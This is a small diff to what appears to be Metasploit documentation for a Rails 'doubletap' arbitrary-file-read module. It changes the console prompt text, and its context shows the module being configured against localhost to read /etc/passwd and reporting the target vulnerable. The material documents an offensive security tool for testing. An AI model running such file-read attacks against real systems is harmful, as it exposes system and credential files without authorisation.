@@ -38,8 +38,8 @@
 
 
   ```
-msf5 > use auxiliary/gather/rails_doubletap_file_read
-msf5 auxiliary(gather/rails_doubletap_file_read) > options
+msf > use auxiliary/gather/rails_doubletap_file_read
+msf auxiliary(gather/rails_doubletap_file_read) > options
 
 Module options (auxiliary/gather/rails_doubletap_file_read):
 
@@ -53,13 +53,13 @@ Module options (auxiliary/gather/rails_doubletap_file_read):
    TARGET_FILE  /etc/passwd      yes       The absolute path of remote file to read.
    VHOST                         no        HTTP server virtual host
 
-msf5 auxiliary(gather/rails_doubletap_file_read) > set RHOSTS localhost
+msf auxiliary(gather/rails_doubletap_file_read) > set RHOSTS localhost
 RHOSTS => localhost
-msf5 auxiliary(gather/rails_doubletap_file_read) > set RPORT 8000
+msf auxiliary(gather/rails_doubletap_file_read) > set RPORT 8000
 RPORT => 8000
-smsf5 auxiliary(gather/rails_doubletap_file_read) > set ROUTE /demo
+smsf auxiliary(gather/rails_doubletap_file_read) > set ROUTE /demo
 ROUTE => /demo
-msf5 auxiliary(gather/rails_doubletap_file_read) > run
+msf auxiliary(gather/rails_doubletap_file_read) > run
 [*] Running module against 127.0.0.1
 
 [+] Target is vulnerable!
